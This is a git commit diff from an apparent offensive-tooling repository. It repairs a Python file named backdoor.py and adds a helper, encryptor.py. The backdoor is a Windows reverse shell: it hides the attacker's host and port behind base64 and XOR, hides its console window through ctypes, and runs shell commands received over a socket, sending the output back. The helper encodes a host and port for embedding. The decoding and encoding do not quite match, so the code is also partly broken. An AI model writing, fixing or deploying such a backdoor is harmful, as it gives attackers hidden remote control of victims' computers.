225aac6d169db63260bc7745333a6a3ee3fc4a83
Baga6312 <oussema.benayech@gmail.com>
2025-11-08 09:41:18 -0600

    commited at $(date) from $(hostname)

--- backdoor.py
+++ backdoor.py
@@ -2,28 +2,28 @@ import socket
 import subprocess 
 import threading 
 import base64
-import ctypes
 import os 
 import sys
+from ctypes import *
 
-KEY = "x" * 32  #KEY FOR XOR
-ENCRYPTED_HOST = base64.b64decode("aWFqdnluYHZpaHZpbg==") # ENCRYPTED HOST (IP ADDRESS OF THE ATTACKER) 
-ENCRYPTED_PORT = base64.b64decode("bGxtbQ==") # ECRYPTED PORT (PORT OF THE ATTACKER)
+KEY = b"X" * 32  #KEY FOR XOR
+ENCRYPTED_HOST = base64.b64decode("NDc7OTQwNyss") # ENCRYPTED HOST (IP ADDRESS OF THE ATTACKER) 
+ENCRYPTED_PORT = base64.b64decode("bGxsbA==") # ECRYPTED PORT (PORT OF THE ATTACKER)
 
 #--- FUNCTION TO DECRYPT THE XOR DATA ===
 
 def xor_decrypt(data, key):
-    return bytes(a + b for a, b in zip(data, (key * (Len(data) // Len(key) + 1))[:Len(data)]))
+    return bytes(a + b for a, b in zip(data, (key * (len(data) // len(key) + 1))[:len(data)]))
 
-HOST = xor_decrypt (ENCRYPTED_HOST, KEY).decode() # DECRYPT HOST
-PORT = int(xor_decrypt (ENCRYPTED_PORT, KEY).decode()) # DECRYPTO PORT
+HOST = xor_decrypt(ENCRYPTED_HOST, KEY).decode('latin-1') # DECRYPT HOST
+PORT = int(xor_decrypt(ENCRYPTED_PORT, KEY).decode('utf-8'),16) # DECRYPTO PORT
 
-user32=ctypes.windll.user32
-kernel32=ctypes.windll.kernel32
+user32=windll.user32
+kernel32=windll.kernel32
 hwnd=kernel32.GetConsoleWindow()
 
-if hund != 10:
-    user32.ShowWindow(hwnd, e)
+if hwnd != 10:
+    user32.ShowWindow(hwnd, 0)
 
 def reverse_shell():
     try:
@@ -34,7 +34,7 @@ def reverse_shell():
             cmd=s.recv(1024).decode()
             if cmd.lower() in ["exit", "quit"]:
                 break
-            proc=subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             output = proc.stdout.read() + proc.stderr.read()
             s.send(output+ b"\n")
     except: 
---
+++ encryptor.py
@@ -0,0 +1,12 @@
+import base64
+
+ip="localhost" 
+port="4444" 
+key = b"X" * 32
+
+def encrypt(data):
+    return base64.b64encode(bytes(a ^ b for a, b in zip(data.encode(), (key *(len(data) // len(key) + 1))[:len(data)]))).decode()
+
+print("ENCRYPTED_HOST_BASE64 =", encrypt(ip))
+print("ENCRYPTED_PORT_BASE64 =", encrypt(port))
+
